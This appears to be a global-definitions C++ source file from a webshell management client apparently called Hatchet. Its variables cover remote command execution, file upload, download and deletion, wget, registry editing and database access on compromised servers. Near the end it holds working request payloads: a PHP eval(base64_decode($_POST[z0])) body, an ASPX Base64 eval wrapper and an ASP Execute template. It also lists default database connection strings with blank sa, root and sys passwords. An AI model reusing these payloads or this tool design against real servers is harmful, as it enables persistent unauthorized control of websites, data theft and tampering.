// stdafx.cpp : source file that includes just the standard includes
// Hatchet.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"


int		nShowTab = -1;					//当前显示的TAB，对比，不用每次都变，放到全局，因为点击左边，没有改变

CEdit	m_edit;							//状态栏
CEdit	m_version_edit;					//版本

CPData* pMydb = NULL;
CStringArray MydbArray;

CPData* pMydbTmp = NULL;
CStringArray MydbTmpArray;

bool bCloseTab;//创建TAB，加载管理失败。关闭tab

CString szError;//http 失败返回信息
bool	bHttpIsOK;//http 是否OK

CString			szGlobal_SiteUrl;							//Shell Url
CString			szGlobal_SiteJoinUrl;							//Shell Join Url
CString			szGlobal_SitePass;							//Shell Pass
int				nGlobal_SiteCode;							//Shell Code 编码
CString			szGlobal_SiteConfig;						//Shell Config
int				nGlobal_SiteScript;							//Shell Script
CString			szGlobal_SiteFileSave;						//保存文件传递文件路径

//////////////////////////////////////////////////////////////////////////
CString			szCmdGetInfo[4];							//CMD管理
CString			szCmdGetExec[4];							//执行CMD
CString			szFileGetInfo[4];							//文件管理
CString			szFileGetFiles[4];							//获取文件列表
CString			szFileGetFileContent[4];					//获取文件内容
CString			szFileSaveFileContent[4];					//保存文件内容
CString			szFileUpload[4];							//文件上传
CString			szFileDelete[4];							//文件删除
CString			szFileReName[4];							//文件重命名
CString			szFileChangeTime[4];						//修改文件时间
CString			szFileNewDir[4];							//新建文件夹
CString			szFileDownFile[4];							//下载文件
CString			szWget[4];									//WGET

CString			szFileCopy[4];								//文件复制
CString			szFileCut[4];								//文件剪切

CString			szRegistryRead[4];							//注册表读取
CString			szRegistryWrite[4];							//注册表写入
CString			szRegistryDelete[4];						//注册表删除


CString			szDataPhpMysql;
CString			szDataPhpMssql;
CString			szDataPhpOracle;
CString			szDataPhpInformix;
CString			szDataPhpPostgreSQL;
CString			szDataPhpODBC_MSSQL;
CString			szDataPhpPDO_MYSQL;
CString			szDataPhpPDO_MSSQL;
//---------------------------------------------------------------------------
CString			szDataAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------

CString			szDataTablePhpMysql;
CString			szDataTablePhpMssql;
CString			szDataTablePhpOracle;
CString			szDataTablePhpInformix;
CString			szDataTablePhpPostgreSQL;
CString			szDataTablePhpODBC_MSSQL;
CString			szDataTablePhpPDO_MYSQL;
CString			szDataTablePhpPDO_MSSQL;
//---------------------------------------------------------------------------
CString			szDataTableAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataTableAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataTableAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataTableAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataTableAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataTableAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataColumnsPhpMysql;
CString			szDataColumnsPhpMssql;
CString			szDataColumnsPhpOracle;
CString			szDataColumnsPhpInformix;
CString			szDataColumnsPhpPostgreSQL;
CString			szDataColumnsPhpODBC_MSSQL;
CString			szDataColumnsPhpPDO_MYSQL;
CString			szDataColumnsPhpPDO_MSSQL;

//---------------------------------------------------------------------------
CString			szDataColumnsAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataColumnsAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataColumnsAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataColumnsAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataColumnsAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataColumnsAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataExecPhpMysql;
CString			szDataExecPhpMssql;
CString			szDataExecPhpOracle;
CString			szDataExecPhpInformix;
CString			szDataExecPhpPostgreSQL;
CString			szDataExecPhpODBC_MSSQL;
CString			szDataExecPhpPDO_MYSQL;
CString			szDataExecPhpPDO_MSSQL;
//---------------------------------------------------------------------------
CString			szDataExecAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataExecAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataExecAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataExecAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataExecAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataExecAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szProxyGetInfo;


//////////////////////////////////////////////////////////////////////////		INI配置
CString			Ini_szUser_Agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
CString			Ini_szHeaders = "Accept-Language: en-us\r\nContent-Type: application/x-www-form-urlencoded\r\n";
bool			Ini_bReferer = true;
bool			Ini_bX_Forwarded_For = true;

CString			Ini_szASP_POST_DATA = "=Execute(\"Execute(\"\"On+Error+Resume+Next:Response.Clear:";
CString			Ini_szASPX_POST_DATA = "=Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(%nPageCode%).GetString("
"System.Convert.FromBase64String(\"%szBase64EvalCode%\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();";
CString			Ini_szPHP_POST_DATA = "=@eval(base64_decode($_POST[z0]));&z0=";
CString			Ini_szPHP_POST_Z0_DATA = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);";

//////////////////////////////////////////////////////////////////////////
CFont			m_FontSample;									//这个要定义成类变量 等宽字体
CStringArray	szGlobal_RandType;
CStringArray	szGlobal_RandTypeExclude;